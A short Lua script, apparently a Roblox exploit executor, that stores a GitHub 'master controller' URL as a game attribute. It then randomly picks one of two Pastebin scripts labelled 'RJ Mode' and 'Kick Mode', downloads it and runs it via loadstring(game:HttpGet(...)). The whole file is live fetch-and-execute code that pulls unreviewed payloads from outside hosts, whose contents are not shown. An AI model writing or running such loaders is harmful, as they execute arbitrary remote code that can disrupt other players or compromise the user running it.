local function executeRandomIdiotScript()
    -- Configured endpoints
    local rjScriptURL = "https://pastebin.com/raw/WR4XTQpG"
    local kickScriptURL = "https://pastebin.com/raw/CD7hnGxm"
    
    -- Hardcoded master controller script address
    local masterFunctionURL = "https://raw.githubusercontent.com/Camtuong153/Scrupt/refs/heads/main/baze0.lua"

    -- Attach the tracking address to the game data model
    game:SetAttribute("MasterExecutorURL", masterFunctionURL)

    -- Roll a random 50/50 chance (1 or 2)
    local roll = math.random(1, 2)
    
    if roll == 1 then
        print("[Executor] Random Choice: Executing RJ Mode")
        local success, result = pcall(function()
            return loadstring(game:HttpGet(rjScriptURL))()
        end)
        if not success then warn("Failed to execute RJ script: " .. tostring(result)) end
        
    else
        print("[Executor] Random Choice: Executing Kick Mode")
        local success, result = pcall(function()
            return loadstring(game:HttpGet(kickScriptURL))()
        end)
        if not success then warn("Failed to execute Kick script: " .. tostring(result)) end
    end
end

-- ==========================================================
-- EXECUTION
-- ==========================================================
executeRandomIdiotScript()
